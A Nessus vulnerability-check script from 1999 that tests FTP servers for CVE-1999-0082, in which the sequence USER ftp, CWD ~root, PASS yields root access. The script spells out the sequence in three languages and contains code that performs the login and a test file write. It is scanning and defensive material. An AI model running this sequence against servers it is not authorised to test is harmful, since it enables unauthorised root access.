#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10083);
 script_version ("$Revision: 1.20 $");
 script_cve_id("CVE-1999-0082");
 name["english"] = "FTP CWD ~root";
 name["francais"] = "FTP CWD ~root";
 name["porugues"] = "FTP CWD ~root";
 script_name(english:name["english"], francais:name["francais"], portugues:name["portugues"]);
 
 desc["english"] = "There is a bug in the FTP server
which allows anyone who issues the following commands
to be logged as root :
USER ftp
CWD ~root
PASS nessus@

Solution : Upgrade your FTP server to a newer version.

Risk factor : High";



 desc["francais"] = "Il y a un bug dans le serveur
FTP qui permet à un pirate effectuant les commandes
suivantes d'obtenir les privilèges du root :
USER ftp
CWD ~root
PASS nessus@

Solution : Upgradez votre serveur FTP.

Facteur de risque : Elevé";



 desc["portugues"] = "Há um bug no servidor FTP que
permite a qualquer pessoa executar os seguintes 
comandos para se logar obtendo privilégios de root:
USER ftp
CWD ~root
PASS nessus@

Solução : Instale uma versão mais recente do seu
servidor FTP.

Fator de risco: Alto";



script_description(english:desc["english"], francais:desc["francais"],
		portugues:desc["portugues"]);
 
 summary["english"] = "Attempts to get root privileges";
 summary["francais"] = "Essaye d'obtenir les privilèges du root";
 summary["portugues"] = "Tentativa de obter privilégio de root";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
		francais:"Ce script est Copyright (C) 1999 Renaud Deraison",
		portugues:"Este script é Copyright (C) 1999 Renaud Deraison");
	
 family["english"] = "FTP";
 family["francais"] = "FTP";
 family["portugues"] = "FTP";
 script_family(english:family["english"], francais:family["francais"],
 		portugues:family["portugues"]);
 script_dependencie("find_service.nes", "ftp_anonymous.nasl", "ftp_root.nasl");
 script_require_keys("ftp/login");
 script_require_ports("Services/ftp", 21);
 exit(0);
}

#
# The script code starts here
#


include("ftp_func.inc");
include("global_settings.inc");


if ( report_paranoia < 2 ) exit(0); 

login = get_kb_item("ftp/login");
password = get_kb_item("ftp/password");

port = get_kb_item("Services/ftp");
if(!port)port = 21;
if(!get_port_state(port))exit(0);


wri = get_kb_item("ftp/writeable_root");
# It the root directory is already writeable, then 
# we can't do the test
if(wri)exit(0);

if(login)
{
 soc = open_sock_tcp(port);
 if(soc)
 {
 b = ftp_recv_line(socket:soc);
 d = string("USER ", login, "\r\n");
 send(socket:soc, data:d);
 b = ftp_recv_line(socket:soc);
 
 d = string("CWD ~root\n");
 send(socket:soc, data:d);
 b = ftp_recv_line(socket:soc);
 
 d = string("PASS ", password, "\r\n");
 send(socket:soc, data:d);
 b = ftp_recv_line(socket:soc);
 
 
 data = string("CWD /\r\n");
 send(socket:soc, data:data);
 a = ftp_recv_line(socket:soc);

 port2 = ftp_pasv(socket:soc);
 if(!port2)exit(0); # ???
 soc2 = open_sock_tcp(port2);
 if ( ! soc2 ) exit(0);
 data = string("STOR .nessus_test_2\r\n");
 send(socket:soc, data:data);
 r = recv_line(socket:soc, length:3);
 close(soc2);
 if(r == "425")
  {
   data = string("DELE .nessus_test_2\r\n");
   send(socket:soc,data:data);
   ftp_recv_line(socket:soc);
   security_hole(port);
   set_kb_item(name:"ftp/root_via_cwd", value:TRUE);
  }
data = string("QUIT\r\n");
send(socket:soc, data:data);
ftp_recv_line(socket:soc);
close(soc);
 }
}
